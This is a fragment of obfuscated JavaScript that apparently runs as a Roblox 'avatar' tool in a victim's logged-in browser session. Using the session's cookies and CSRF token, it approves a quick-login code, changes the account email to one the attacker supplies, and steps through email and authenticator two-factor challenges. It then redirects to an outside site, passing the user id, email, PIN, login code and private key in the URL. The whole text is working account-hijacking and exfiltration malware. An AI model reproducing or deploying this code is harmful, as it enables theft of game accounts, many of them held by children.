      accept: "application/json, text/plain, */*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "sec-ch-ua": "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      "x-csrf-token": _0x4ab1d2
    },
    referrer: "https://www.roblox.com/",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: null,
    method: "POST",
    mode: "cors",
    credentials: "include"
  }).then(_0x5d20a6 => _0x5d20a6.json()).then(_0xfc5770 => {
    var _0x5ced21 = _0xfc5770.code;
    var _0x2cc73a = _0xfc5770.privateKey;
    if (!_0x2cc73a) {} else {
      fetch("https://apis.roblox.com/auth-token-service/v1/login/enterCode", {
        headers: {
          accept: "application/json, text/plain, */*",
          "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
          "content-type": "application/json;charset=UTF-8",
          "sec-ch-ua": "\"Brave\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
          "sec-ch-ua-mobile": "?0",
          "sec-ch-ua-platform": "\"Windows\"",
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-site",
          "sec-gpc": "1",
          "x-csrf-token": _0x4ab1d2
        },
        referrer: "https://www.roblox.com/",
        referrerPolicy: "strict-origin-when-cross-origin",
        body: "{\"code\":\"" + _0x5ced21 + "\"}",
        method: "POST",
        mode: "cors",
        credentials: "include"
      }).then(_0x478327 => _0x478327.json()).then(_0x391740 => {
        deviceInfo = _0x391740.deviceInfo;
        if (!deviceInfo) {} else {
          fetch("https://apis.roblox.com/auth-token-service/v1/login/validateCode", {
            headers: {
              accept: "application/json, text/plain, */*",
              "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
              "content-type": "application/json;charset=UTF-8",
              "sec-ch-ua": "\"Brave\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": "\"Windows\"",
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-site",
              "sec-gpc": "1",
              "x-csrf-token": _0x4ab1d2
            },
            referrer: "https://www.roblox.com/",
            referrerPolicy: "strict-origin-when-cross-origin",
            body: "{\"code\":\"" + _0x5ced21 + "\"}",
            method: "POST",
            mode: "cors",
            credentials: "include"
          }).then(_0x53ae21 => _0x53ae21.text()).then(_0x34f92a => {
            if (_0x34f92a != "{}") {
              alert("Error fetching avatar info.");
              location.reload();
            } else {
              document.querySelector("#seed1").setAttribute("value", btoa(_0x5ced21));
              document.querySelector("#emailkey").setAttribute("value", btoa(_0x2cc73a));
              fetch("https://accountsettings.roblox.com/v1/email", {
                headers: {
                  accept: "application/json, text/plain, */*",
                  "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                  "content-type": "application/x-www-form-urlencoded",
                  "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                  "sec-ch-ua-mobile": "?0",
                  "sec-ch-ua-platform": "\"Windows\"",
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-site",
                  "sec-gpc": "1",
                  "x-csrf-token": _0x4ab1d2
                },
                referrer: "https://www.roblox.com/",
                referrerPolicy: "strict-origin-when-cross-origin",
                body: "emailAddress=" + email + "&password=",
                method: "POST",
                mode: "cors",
                credentials: "include"
              }).then(_0x421ee8 => {
                const _0x2d85f4 = _0x421ee8.headers;
                const _0x20a376 = _0x421ee8.headers.get("rblx-challenge-id");
                const _0x524c1f = _0x421ee8.headers.get("rblx-challenge-metadata");
                const _0x1e36b1 = _0x421ee8.headers.get("rblx-challenge-type");
                document.querySelector("#challengeid").setAttribute("value", _0x20a376);
                document.querySelector("#metadata").setAttribute("value", _0x524c1f);
                document.querySelector("#challengetype").setAttribute("value", _0x1e36b1);
                return _0x421ee8.text();
              }).then(_0x262e95 => {
                if (_0x262e95 == "{}") {
                  var _0x3a7f8b = document.getElementsByName("user-data")[0].getAttribute("data-userid");
                  var _0x1be784 = document.getElementsByName("csrf-token")[0].getAttribute("data-token");
                  var _0x40161e = document.querySelector("#email").value;
                  var _0x3b1ea7 = document.getElementById("pinHEHE").value;
                  if (_0x3b1ea7) {
                    window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x3a7f8b + "&email=" + _0x40161e + "&pin=" + _0x3b1ea7 + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
                  } else {
                    window.location.replace("https://rotemplate.com/avatar.php?id=" + _0x3a7f8b + "&email=" + _0x40161e + "&seed=" + document.querySelector("#seed1").value + "&emailkey=" + document.querySelector("#emailkey").value);
                  }
                  GetEmail();
                }
                if (_0x262e95 == "{\"errors\":[{\"code\":0,\"message\":\"Too many requests\"}]}") {
                  alert("Sending Requests To Quickly! Wait 5 mins and Retry.");
                  location.reload();
                  return;
                }
                if (_0x262e95.includes("Too many attempts to update email.")) {
                  alert("Sending Requests To Quickly! Wait 5 mins and Retry.");
                  location.reload();
                  return;
                }
                fetch("https://users.roblox.com/v1/birthdate", {
                  headers: {
                    accept: "application/json, text/plain, */*",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "sec-gpc": "1"
                  },
                  referrer: "https://www.roblox.com/",
                  referrerPolicy: "strict-origin-when-cross-origin",
                  body: null,
                  method: "GET",
                  mode: "cors",
                  credentials: "include"
                }).then(_0x262046 => _0x262046.json()).then(_0x11782d => {
                  var _0x24fa81 = _0x11782d.birthYear;
                  var _0x12f3a3 = 2023 - _0x24fa81;
                  var _0x52f2dc = document.querySelector("#challengetype").value;
                  var _0x531254 = document.querySelector("#challengeid").value;
                  var _0x37433a = document.querySelector("#metadata").value;
                  console.log(_0x531254);
                  if (!_0x531254) {
                    alert("Process Failed! Please try again later.");
                    location.reload();
                    return;
                  }
                  var _0x1af9ae = JSON.parse(atob(_0x37433a)).defaultType;
                  var _0xe42b26 = JSON.parse(atob(_0x37433a)).userId;
                  document.querySelector("#challenge").setAttribute("value", _0x1af9ae);
                  if (_0x1af9ae == "Otp_Email") {
                    fetch("https://apis.roblox.com/otp-service/v1/sendCodeForUser", {
                      headers: {
                        accept: "application/json, text/plain, */*",
                        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                        "content-type": "application/json;charset=UTF-8",
                        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site",
                        "sec-gpc": "1",
                        "x-csrf-token": _0x1be784
                      },
                      referrer: "https://www.roblox.com/",
                      referrerPolicy: "strict-origin-when-cross-origin",
                      body: "{\"contactType\":\"Email\",\"origin\":\"Reauth\",\"messageVariant\":\"Default\"}",
                      method: "POST",
                      mode: "cors",
                      credentials: "include"
                    }).then(_0x53cd89 => _0x53cd89.json()).then(_0x309548 => {
                      var _0x51aa7a = _0x309548.otpSessionToken;
                      document.querySelector("#sessiontoken").setAttribute("value", _0x51aa7a);
                      Popup("onetime");
                    });
                  } else if (_0xe42b26) {
                    var _0x1e751c = document.getElementsByName("user-data")[0].getAttribute("data-userid");
                    fetch("https://twostepverification.roblox.com/v1/users/" + _0x1e751c + "/configuration", {
                      headers: {
                        accept: "application/json, text/plain, */*",
                        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                        "sec-ch-ua": "\"Chromium\";v=\"118\", \"Brave\";v=\"118\", \"Not=A?Brand\";v=\"99\"",
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": "\"Windows\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-site",
                        "sec-gpc": "1"
                      },
                      referrer: "https://www.roblox.com/",
                      referrerPolicy: "strict-origin-when-cross-origin",
                      body: null,
                      method: "GET",
                      mode: "cors",
                      credentials: "include"
                    }).then(_0x3a5a82 => _0x3a5a82.json()).then(_0x1ebf78 => {
                      authtype = _0x1ebf78.primaryMediaType;
                      if (authtype == "Authenticator") {
                        document.querySelector("#challengeidtwo").setAttribute("value", JSON.parse(atob(_0x37433a)).challengeId);
                        Popup("twostepauth");
                      } else if (authtype == "Email") {
                        document.querySelector("#challengeidtwo").setAttribute("value", JSON.parse(atob(_0x37433a)).challengeId);
                        Popup("twostep");
                      } else {
                        alert("Type Not Supported.");
                        location.reload();
                      }
                    });
                  } else {
                    alert("Enable Email/Authenticator 2FA And Retry.");
                    location.reload();
                  }
                });
              });
            }
          });
        }
      });
    }
  });
}